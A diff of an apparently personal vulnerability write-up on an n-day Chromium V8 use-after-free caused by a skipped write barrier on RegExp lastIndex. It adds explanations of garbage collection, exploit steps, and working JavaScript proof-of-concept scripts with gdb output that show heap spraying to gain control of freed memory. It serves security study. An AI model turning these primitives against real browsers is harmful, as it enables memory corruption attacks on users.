@@ -100,8 +100,13 @@ Looking into the patched function, we could see that when updating the `lastInde
 on a `RegExp` object, there is no update on write barrier.
 
 A write barrier, essentially, is an indicator used by the garbage collector (GC) to
-perform re-marking[^wb]. Looking into the [source code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.h;l=50;drc=f4a00cc248dd2dc8ec8759fb51620d47b5114090;bpv=0;bpt=1),
-we could infer that the `UPDATE_WRITE_BARRIER` forces the GC to re-marking, while `SKIP_WRITE_BARRIER` does not.
+perform remarking on the whole heap[^wb]. Looking into the [source code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.h;l=50;drc=f4a00cc248dd2dc8ec8759fb51620d47b5114090;bpv=0;bpt=1),
+we could infer that the `UPDATE_WRITE_BARRIER` forces the GC to do remarking, while `SKIP_WRITE_BARRIER` does not.
+`UPDATE_WRITE_BARRIER` exists because there is a type of garbage collection, called minor GC,
+which only do marking on some part of the heap. With `UPDATE_WRITE_BARRIER`, the
+GC could tell that an object `X` is reference by other object `Y` that lives on
+the other part of the heap, which minor GC does not act on. As a result, this object
+`X` would not be free and this prevent UAF.
 
 ```cpp
 // UNSAFE_SKIP_WRITE_BARRIER skips the write barrier.
@@ -168,9 +173,24 @@ and try to re-create the PoC. Essentially, with the `SKIP_WRITE_BARRIER`, we
 could cause the GC to free the `HeapNumber` object created by `NewNumberFromInt64`
 which makes the `lastIndex` property to be a dangling pointer (UAF).
 
+[^wb]: <https://v8.dev/blog/concurrent-marking>
+
+[^smi-range]: <https://medium.com/fhinkel/v8-internals-how-small-is-a-small-integer-e0badc18b6da>
+
 ## Exploit Development
 
 ### Getting UAF
+
+#### TL;DR
+
+1. create a `RegExp` object (`re`)
+2. force major gc such that `re` goes into `OldSpace`
+3. this makes `re.lastIndex` heap number to be allocated at `NewSpace`
+4. force minor gc
+5. garbage collection results in the previous `HeapNumber` object to be freed due to `SKIP_WRITE_BARRIER` causing the GC to not be aware that `re` object has reference to this `HeapNumber`
+6. UAF profit
+
+#### Explanation
 
 First, let's try to grep which part of code calls into `SetLastIndex` function.
 
@@ -373,7 +393,7 @@ with our own supplied function.
 var re = new RegExp("leet", "g");
 re.lastIndex = 1337;
 re.exec = function () {
-    return [""]
+    return [""]  // to get into `SetAdvancedStringIndex`
 }
 re[Symbol.replace]("", "l33t");  // infinite loop
 console.log(re.lastIndex);
@@ -387,8 +407,8 @@ this function again to return `null`.
 var re = new RegExp("leet", "g");
 re.lastIndex = 1337;
 re.exec = function () {
-    re.exec = function () { return null; };
-    return [""];
+    re.exec = function () { return null; };  // to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
 }
 re[Symbol.replace]("", "l33t");
 console.log(re.lastIndex);  // 0
@@ -406,8 +426,8 @@ var re = new RegExp("leet", "g");
 re.lastIndex = 1337;
 re.exec = function () {
     re.lastIndex = 1337;
-    re.exec = function () { return null; };
-    return [""];
+    re.exec = function () { return null; };  // to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
 }
 re[Symbol.replace]("", "l33t");
 console.log(re.lastIndex);  // 1338 == 1337+1
@@ -428,8 +448,8 @@ var exec_bak = RegExp.prototype.exec;  // backup original exec()
 RegExp.prototype.exec = function () { return null; };
 re.exec = function () {
     re.lastIndex = 1337;
-    delete re.exec;  // to pass `HasInitialRegExpMap` check
-    return [""];
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
 }
 re[Symbol.replace]("", "l33t");
 console.log(re.lastIndex);  // 1338 == 1337+1
@@ -444,19 +464,30 @@ we can try to simulate some garbage collection to observe how `re` and `re.lastI
 var re = new RegExp("leet", "g");
 var exec_bak = RegExp.prototype.exec;  // backup original exec()
 RegExp.prototype.exec = function () { return null; };
+var n = 1073741824
 re.exec = function () {
-    re.lastIndex = 1337;
-    delete re.exec;  // to pass `HasInitialRegExpMap` check
-    return [""];
+    re.lastIndex = n;
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
 }
 re[Symbol.replace]("", "l33t");
-console.log(re.lastIndex);  // 1338 == 1337+1
+console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
 RegExp.prototype.exec = exec_bak;  // restore original exec()
 
 eval("%DebugPrint(re)");
+eval("%DebugPrint(re.lastIndex)");
 eval("%SystemBreak()");
-gc({type:'minor'});  // minor gc / scavenge (enabled by --expose-gc)
-gc();  // major gc / mark and sweep
+
+gc({type:'minor'});  // minor gc / scavenge (enabled by --expose-gc)  [1]
+
+eval("%DebugPrint(re)");
+eval("%DebugPrint(re.lastIndex)");
+eval("%SystemBreak()");
+
+gc({type:'minor'});  // minor gc / scavenge (enabled by --expose-gc)  [2]
+eval("%DebugPrint(re)");
+eval("%DebugPrint(re.lastIndex)");
+eval("%SystemBreak()");
 ```
 
 To execute the script, we need to enable some command line flags.
@@ -465,56 +496,214 @@ To execute the script, we need to enable some command line flags.
 ./d8 --allow-natives-syntax --expose-gc --trace-gc pwn.js
 ```
 
-After several trial-and-error, it could be observed that the address of `re` and
-the value of `re.lastIndex` (address of `HeapNumber` object) always end up on
-near to each other. This is because `TODO`
+Initially, `re` lives in `NewSpace`. After `re[Symbol.replace]`, the `HeapNumber`
+is allocated at `NewSpace` as well.
 
-One thing that we could try is to force garbage collection before `re.lastIndex`
-`HeapNumber` object is allocated, such that it would be allocated at different
-space compared to `re` as `re` has been garbage collected to `OldSpace` and `HeapNumber`
-is allocated at `NewSpace`.
+```console
+gef> run
+0x100e00048375 <JSRegExp <String[4]: #leet>>
+0x100e00049045 <HeapNumber 1073741825.0>
+
+gef> vmmap
+[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
+Start              End                Size               Offset             Perm Path
+0x0000100600000000 0x0000100e00000000 0x0000000800000000 0x0000000000000000 ---
+0x0000100e00000000 0x0000100e00010000 0x0000000000010000 0x0000000000000000 r--   <-  $r14
+0x0000100e00010000 0x0000100e00020000 0x0000000000010000 0x0000000000000000 ---
+0x0000100e00020000 0x0000100e00040000 0x0000000000020000 0x0000000000000000 r--
+0x0000100e00040000 0x0000100e00145000 0x0000000000105000 0x0000000000000000 rw-  # `re` and `HeapNumber` live here
+0x0000100e00145000 0x0000100e00180000 0x000000000003b000 0x0000000000000000 ---
+0x0000100e00180000 0x0000100e001c0000 0x0000000000040000 0x0000000000000000 rw-   <-  $r8  
+0x0000100e001c0000 0x0000100e00300000 0x0000000000140000 0x0000000000000000 ---
+0x0000100e00300000 0x0000100e00314000 0x0000000000014000 0x0000000000000000 r--
+0x0000100e00314000 0x0000100e00340000 0x000000000002c000 0x0000000000000000 ---
+0x0000100e00340000 0x0000111600000000 0x00000107ffcc0000 0x0000000000000000 ---
+0x0000354600000000 0x0000354600040000 0x0000000000040000 0x0000000000000000 rw-
+0x0000354600040000 0x0000354610000000 0x000000000ffc0000 0x0000000000000000 ---
+```
+
+Next, when we do minor GC [1], both `re` and `HeapNumber` moves to
+`Intermediary/To-Space` of `NewSpace`.
+
+```console
+gef> c
+[7022:0x555556d7b000]   139382 ms: Scavenge 0.1 (1.5) -> 0.1 (1.5) MB, 16.24 / 0.00 ms  (average mu = 1.000, current mu = 1.000) testing;
+0x100e001c755d <JSRegExp <String[4]: #leet>>
+0x100e001c75d5 <HeapNumber 1073741825.0>
+
+gef> vmmap
+[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
+Start              End                Size               Offset             Perm Path
+0x0000100600000000 0x0000100e00000000 0x0000000800000000 0x0000000000000000 ---
+0x0000100e00000000 0x0000100e00010000 0x0000000000010000 0x0000000000000000 r--   <-  $r14
+0x0000100e00010000 0x0000100e00020000 0x0000000000010000 0x0000000000000000 ---
+0x0000100e00020000 0x0000100e00040000 0x0000000000020000 0x0000000000000000 r--
+0x0000100e00040000 0x0000100e00140000 0x0000000000100000 0x0000000000000000 ---
+0x0000100e00140000 0x0000100e00145000 0x0000000000005000 0x0000000000000000 rw-
+0x0000100e00145000 0x0000100e00180000 0x000000000003b000 0x0000000000000000 ---
+0x0000100e00180000 0x0000100e002c0000 0x0000000000140000 0x0000000000000000 rw-   <-  $r8  # `re` and `HeapNumber` live here
+0x0000100e002c0000 0x0000100e00300000 0x0000000000040000 0x0000000000000000 ---
+0x0000100e00300000 0x0000100e00314000 0x0000000000014000 0x0000000000000000 r--
+0x0000100e00314000 0x0000100e00340000 0x000000000002c000 0x0000000000000000 ---
+0x0000100e00340000 0x0000111600000000 0x00000107ffcc0000 0x0000000000000000 ---
+0x0000354600000000 0x0000354600040000 0x0000000000040000 0x0000000000000000 rw-
+0x0000354600040000 0x0000354610000000 0x000000000ffc0000 0x0000000000000000 ---
+```
+
+If we do minor GC once more [2], both `re` and `HeapNumber` would move to the `OldSpace`.
+
+```console
+gef> c
+[7022:0x555556d7b000]   264864 ms: Scavenge 0.1 (1.5) -> 0.1 (1.5) MB, 18.34 / 0.00 ms  (average mu = 1.000, current mu = 1.000) testing;
+0x100e0019f02d <JSRegExp <String[4]: #leet>>
+0x100e0019f0a5 <HeapNumber 1073741825.0>
+
+gef> vmmap
+[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
+Start              End                Size               Offset             Perm Path
+0x0000100600000000 0x0000100e00000000 0x0000000800000000 0x0000000000000000 ---
+0x0000100e00000000 0x0000100e00010000 0x0000000000010000 0x0000000000000000 r--   <-  $r14
+0x0000100e00010000 0x0000100e00020000 0x0000000000010000 0x0000000000000000 ---
+0x0000100e00020000 0x0000100e00040000 0x0000000000020000 0x0000000000000000 r--
+0x0000100e00040000 0x0000100e00145000 0x0000000000105000 0x0000000000000000 rw-
+0x0000100e00145000 0x0000100e00180000 0x000000000003b000 0x0000000000000000 ---
+0x0000100e00180000 0x0000100e001c0000 0x0000000000040000 0x0000000000000000 rw-   <-  $r8  # `re` and `HeapNumber` live here
+0x0000100e001c0000 0x0000100e002c0000 0x0000000000100000 0x0000000000000000 ---            # (notice that the previous NewSpace have been splitted)
+0x0000100e002c0000 0x0000100e00300000 0x0000000000040000 0x0000000000000000 ---
+0x0000100e00300000 0x0000100e00314000 0x0000000000014000 0x0000000000000000 r--
+0x0000100e00314000 0x0000100e00340000 0x000000000002c000 0x0000000000000000 ---
+0x0000100e00340000 0x0000111600000000 0x00000107ffcc0000 0x0000000000000000 ---
+0x0000354600000000 0x0000354600040000 0x0000000000040000 0x0000000000000000 rw-
+0x0000354600040000 0x0000354610000000 0x000000000ffc0000 0x0000000000000000 ---
+```
+
+You may wonder why does the first minor GC consider `HeapNumber` as a live object
+even though `re.lastIndex` is set with `SKIP_WRITE_BARRIER`. This is because minor
+GC perform marking starting from `re` (since it is in `NewSpace`) and it could
+reach `HeapNumber` via `re.lastIndex`. The same applies when doing major GC
+instead of minor GC initially.
+
+Things would be different if `re` lives in `OldSpace`, while `HeapNumber` lives
+in `NewSpace`. When we do a minor GC, `re` is ignored as minor GC only covers `NewSpace`.
+Furthermore, because of the `SKIP_WRITE_BARRIER`, the GC does not aware that
+there is a reference to the `HeapNumber` from the `OldSpace`. This causes the
+`HeapNumber` object to be garbage collected while `re.lastIndex` still points
+to the freed memory, which is basically a UAF on `re.lastIndex`.
+
+If `UPDATE_WRITE_BARRIER` is used instead, `HeapNumber` would eventually
+transition to `OldSpace` since the GC is aware of the reference to `HeapNumber`.
 
 ```js
 // pwn.js
 var re = new RegExp("leet", "g");
 var exec_bak = RegExp.prototype.exec;  // backup original exec()
-RegExp.prototype.exec = function () { return null; };
+var n = 1073741824
 re.exec = function () {
-    re.lastIndex = 1337;
-    delete re.exec;  // to pass `HasInitialRegExpMap` check
-    return [""];
+    re.lastIndex = n;
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
 }
-gc();  // major gc / mark and sweep
+eval("%DebugPrint(re)");
+gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
 re[Symbol.replace]("", "l33t");
-console.log(re.lastIndex);  // 1338 == 1337+1
+console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
 RegExp.prototype.exec = exec_bak;  // restore original exec()
 
 eval("%DebugPrint(re)");
-eval("%SystemBreak()");
+eval("%DebugPrint(re.lastIndex)");
+
+gc({type:'minor'})  // causes `HeapNumber` to be garbage collected [1]
+
+var spray = [0.0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0]
+
+eval("%DebugPrint(re)");
+eval("%DebugPrint(spray)");
 ```
 
-To summarize:
-1. create a `RegExp` object
-2. force major gc
-3. our `RegExp` object is garbage collected into `OldSpace`
-4. our `lastIndex` property transitions into `HeapNumber` object
-5. force minor gc
-6. collection results in the previous `HeapNumber` object to be freed
-7. this is because of `SKIP_WRITE_BARRIER` when setting `lastIndex` property which leads to the `HeapNumber` object remains white colored (considered as unreachable and safe to be freed)
+If we only run the code above, we notice that `re` and `HeapNumber` is not so
+far apart, but they are actually on two different space. However, `spray` is
+not allocated at the same space as our freed `HeapNumber`.
 
-<!-- When `lastIndex` transitions into `HeapNumber` object and the GC is forced to do -->
-<!-- garbage collection, this `HeapNumber` object remains in white color, which means -->
-<!-- that this object is unreachable, as there is no re-marking. -->
+```console
+0x228b0004837d <JSRegExp <String[4]: #leet>>
+[16454:0x55d1bbdce000]        2 ms: Mark-Compact 0.1 (1.5) -> 0.1 (2.5) MB, 0.47 / 0.00 ms  (average mu = 0.645, current mu = 0.645) testing; GC in old space requested
+0x228b0019a705 <JSRegExp <String[4]: #leet>>
+0x228b001c2155 <HeapNumber 1073741825.0>
+[16454:0x55d1bbdce000]        2 ms: Scavenge 0.1 (2.5) -> 0.1 (2.5) MB, 0.03 / 0.00 ms  (average mu = 0.645, current mu = 0.645) testing;
+0x228b0019a705 <JSRegExp <String[4]: #leet>>
+0x228b000421dd <JSArray[11]>
+```
 
-<!-- The first thing to note is the high level overview of the vulnerability itself, -->
-<!-- i.e., dangling pointer on `lastIndex` which causes use-after-free (UAF). -->
-<!-- How can `lastIndex` contains a pointer to an object? Well, this is the result of -->
-<!-- `NewNumberFromInt64` which returns `NewHeapNumber`. -->
+When the minor GC [1] happens, the space occupied by `HeapNumber` is considered
+as the `Nursery/From-Space` (call this `A`) space and live object is evacuated from this space
+to `Intermediate/To-Space` (call this `B`). After the minor GC is done, the previous `Nursery/From-Space` (`A`)
+has now become `Intermediate/To-Space` and the previous `Intermediate/To-Space` (`B`)
+has now become `Nursery/From-Space`. Now, when new objects are allocated, they
+would be placed on `B`, since `B` is now the `Nursery/From-Space`. Next, if we do
+another minor GC, new object would now be allocated at `A` instead of `B`.
 
 
-[^wb]: <https://v8.dev/blog/concurrent-marking>
+```js
+var re = new RegExp("leet", "g");
+var exec_bak = RegExp.prototype.exec;  // backup original exec()
+RegExp.prototype.exec = function () { return null; };
+var n = 1073741824
+re.exec = function () {
+    re.lastIndex = n;
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
+}
+eval("%DebugPrint(re)");
+gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
+re[Symbol.replace]("", "l33t");
+console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
+RegExp.prototype.exec = exec_bak;  // restore original exec()
 
-[^smi-range]: <https://medium.com/fhinkel/v8-internals-how-small-is-a-small-integer-e0badc18b6da>
+eval("%DebugPrint(re)");
+eval("%DebugPrint(re.lastIndex)");
+
+gc({type:'minor'})  // causes `HeapNumber` to be garbage collected
+gc({type:'minor'})  // switches `Nursery` and `Intermediate` such that new object is allocated near our old `HeapNumber`
+
+var spray = [0.0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0]
+
+eval("%DebugPrint(re)");
+eval("%DebugPrint(spray)");
+```
+
+When we run the above code, as expected, `spray` is now allocated near our old
+`HeapNumber` address. Now, our `re.lastIndex` actually points to the elements of
+`spray`, and we essentially have UAF and full control over the memory pointed
+by `re.lastIndex`.
+
+```console
+gef> run
+0x199c000483ad <JSRegExp <String[4]: #leet>>
+[16796:0x555556d7b000]       14 ms: Mark-Compact 0.1 (1.5) -> 0.1 (2.5) MB, 7.07 / 0.00 ms  (average mu = 0.440, current mu = 0.440) testing; GC in old space requested
+0x199c0019a71d <JSRegExp <String[4]: #leet>>
+0x199c001c2155 <HeapNumber 1073741825.0>
+[16796:0x555556d7b000]       25 ms: Scavenge 0.1 (2.5) -> 0.1 (2.5) MB, 5.75 / 0.00 ms  (average mu = 0.440, current mu = 0.440) testing;
+[16796:0x555556d7b000]       30 ms: Scavenge 0.1 (2.5) -> 0.1 (2.5) MB, 5.73 / 0.00 ms  (average mu = 0.440, current mu = 0.440) testing;
+0x199c0019a71d <JSRegExp <String[4]: #leet>>
+0x199c001c21a9 <JSArray[11]>
+
+gef> tele 0x199c001c21a8 2
+0x199c001c21a8|+0x0000|+000: 0x000006cd0018ece1
+0x199c001c21b0|+0x0008|+001: 0x00000016001c2149
+gef> tele 0x199c001c2148 10
+0x199c001c2148|+0x0000|+000: 0x0000001600000851
+0x199c001c2150|+0x0008|+001: 0x3fb999999999999a
+0x199c001c2158|+0x0010|+002: 0x3ff199999999999a
+0x199c001c2160|+0x0018|+003: 0x4000cccccccccccd
+0x199c001c2168|+0x0020|+004: 0x4008cccccccccccd
+0x199c001c2170|+0x0028|+005: 0x4010666666666666
+0x199c001c2178|+0x0030|+006: 0x4014666666666666
+0x199c001c2180|+0x0038|+007: 0x4018666666666666
+0x199c001c2188|+0x0040|+008: 0x401c666666666666
+0x199c001c2190|+0x0048|+009: 0x4020333333333333
+```
+
+TODO: create own major and minor gc
 
 ## Reference
 
@@ -525,6 +714,7 @@ To summarize:
 - <https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Bohan%20Liu%20Zheng%20Wang%20GuanCheng%20Li%20-%20ndays%20are%20also%200days%20Can%20hackers%20launch%200day%20RCE%20attack%20on%20popular%20softwares%20only%20with%20chromium%20ndays.pdf>
 - <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/@@replace#examples>
 - <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex#examples>
+- [V8 Garbage Collection Note](../../../../notes/pwn/v8/#garbage-collection)
 
 ## Appendix
 
